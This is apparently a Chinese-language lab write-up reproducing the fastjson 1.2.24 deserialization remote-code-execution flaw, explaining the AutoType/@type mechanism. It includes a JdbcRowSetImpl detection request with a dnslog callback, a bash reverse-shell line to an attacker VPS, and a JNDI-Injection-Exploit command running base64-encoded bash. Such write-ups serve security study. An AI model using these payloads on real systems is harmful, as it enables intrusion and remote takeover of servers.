# fastjson1.2.24-RCE漏洞复现

## 漏洞原理及分析

这段就大量引用网上师傅到博客：

https://www.cnblogs.com/EddieMurphy-blogs/p/18064168

fastjson 是一个 有阿里开发的一个开源Java 类库，可以将 Java 对象转换为 JSON 格式(序列化)，当然它也可以将 JSON 字符串转换为 Java 对象（反序列化）。Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象（这就是漏洞来源，下文会解释）。使用比较广泛。

## fastjson序列化/反序列化原理

fastjson的漏洞本质还是一个java的反序列化漏洞，由于引进了AutoType功能，fastjson在对json字符串反序列化的时候，会读取到@type的内容，将json内容反序列化为java对象并调用这个类的setter方法。

那么为啥要引进Auto Type功能呢？

fastjson在序列化以及反序列化的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。其实，对于JSON框架来说，想要把一个Java对象转换成字符串，可以有两种选择：

1.基于setter/getter

2.基于属性（AutoType）

基于setter/getter会带来什么问题呢，下面举个例子，假设有如下两个类：

```java
class Apple implements Fruit {
    private Big_Decimal price;
    //省略 setter/getter、toString等
}
 
class iphone implements Fruit {
    private Big_Decimal price;
    //省略 setter/getter、toString等
}
```

实例化对象之后，假设苹果对象的price为0.5，Apple类对象序列化为json格式后为：

```json
{"Fruit":{"price":0.5}}
```

假设iphone对象的price为5000,序列化为json格式后为：

```json
{"Fruit":{"price":5000}}
```

当一个类只有一个接口的时候，将这个类的对象序列化的时候，就会将子类抹去（apple/iphone）只保留接口的类型(Fruit)，最后导致反序列化时无法得到原始类型。本例中，将两个json再反序列化生成java对象的时候，无法区分原始类是apple还是iphone。

为了解决上述问题： fastjson引入了基于属性（AutoType），即在序列化的时候，先把原始类型记录下来。使用@type的键记录原始类型，在本例中，引入AutoType后，Apple类对象序列化为json格式后为：

```json
{ "fruit":{ "@type":"com.hollis.lab.fastjson.test.Apple", "price":0.5 } }
```

引入AutoType后，iphone类对象序列化为json格式后为：

```json
{ "fruit":{ "@type":"com.hollis.lab.fastjson.test.iphone", "price":5000 } }
```

这样在反序列化的时候就可以区分原始的类了。



使用AutoType功能进行序列号的JSON字符会带有一个@type来标记其字符的原始类型，在反序列化的时候会读取这个@type，来试图把JSON内容反序列化到对象，并且会调用这个库的setter或者getter方法，然而，@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。

常见的有sun官方提供的一个类**com.sun.rowset.JdbcRowSetImpl**，其中有个dataSourceName方法支持传入一个rmi的源，只要解析其中的url就会支持远程调用！因此整个漏洞复现的原理过程就是：

```txt
1、攻击者（我们）访问存在fastjson漏洞的目标靶机网站，通过burpsuite抓包改包，以json格式添加com.sun.rowset.JdbcRowSetImpl恶意类信息发送给目标机。
2、存在漏洞的靶机对json反序列化时候，会加载执行我们构造的恶意信息(访问rmi服务器)，靶机服务器就会向rmi服务器请求待执行的命令。也就是靶机服务器问rmi服务器，（靶机服务器）需要执行什么命令啊？
3、rmi 服务器请求加载远程机器的class（这个远程机器是我们搭建好的恶意站点，提前将漏洞利用的代码编译得到.class文件，并上传至恶意站点），得到攻击者（我们）构造好的命令（ping dnslog或者创建文件或者反弹shell啥的）
4、rmi将远程加载得到的class（恶意代码），作为响应返回给靶机服务器。
靶机服务器执行了恶意代码，被攻击者成功利用。
```

## 漏洞探测

```http
POST / HTTP/1.1
Host: vps:8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 153

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"dns://ljgebm.dnslog.cn",
        "autoCommit":true
    }
}
```

dns服务器刷新数据出现访问记录证明存在漏洞。

## 漏洞复现

payload直接打：

```bash
bash -i >& /dev/tcp/vps/port 0>&1
```

```bash
//payload
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,<base64后的命令>}|{base64,-d}|{bash,-i}" -A 攻击机ip
```

![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/file-20241211202506937.png)
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/file-20241211202520398.png)
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/file-20241211202529844.png)

本身也是Java反序列化造成的漏洞，基本攻击流程都是，探测payload位置->利用jndn，rmi等协议远程请求->触发反序列化执行恶意字节码文件->反弹shell/命令执行。

工具简化了本地编译恶意class文件，开启jndi协议等操作。

## 踩坑

注意要将数据包中的类型字段改成json。

因为使用的vps搭建靶场和攻击，注意端口开放情况。

[mbechler/marshalsec (github.com)](https://github.com/mbechler/marshalsec)这个工具也可以开启rmi服务，但**无论你哪里起服务，一定要保证java和javac的版本是1.8，版本要求非常严苛，不然出不了的。**因此最后放弃，改用现在的工具。
